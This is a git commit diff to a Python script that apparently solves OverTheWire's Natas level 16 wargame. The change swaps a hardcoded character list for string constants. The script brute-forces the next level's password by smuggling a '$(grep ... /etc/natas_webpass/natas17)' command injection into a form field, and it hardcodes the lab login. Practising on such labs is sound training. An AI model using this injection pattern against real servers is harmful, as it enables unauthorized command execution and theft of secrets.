e2117e1a0cbf77abebeba66107be79638d0dc6c5
simba0x41 <simba0x41@gmail.com>
2020-12-07 02:41:01 -0500

    importando libreria string al script level16

--- overthewire.org/natas/level16.py
+++ overthewire.org/natas/level16.py
@@ -1,19 +1,20 @@
 #!/usr/bin/env python
 
 import requests
-import urllib
-import array
 import re
+from string import *
 
 USER = 'natas16'
 PASSWORD = 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'
 url = 'http://natas16.natas.labs.overthewire.org/'
-letters = ["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z","0","1","2","3","4","5","6","7","8","9"]
+#letters = ["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z","0","1","2","3","4","5","6","7","8","9"]
+
+caracters = lowercase + uppercase + digits
 
 i=0
 key=""
 while(i<32):
-    for l in letters:
+    for l in caracters:
         r = requests.Session()
         #session = r.get('http://natas11.natas.labs.overthewire.org/', auth=(USER, PASSWORD'))
         response = r.post(url, data= {"needle":"passwords$(grep ^"+key+l+"  /etc/natas_webpass/natas17)"},auth=(USER, PASSWORD))
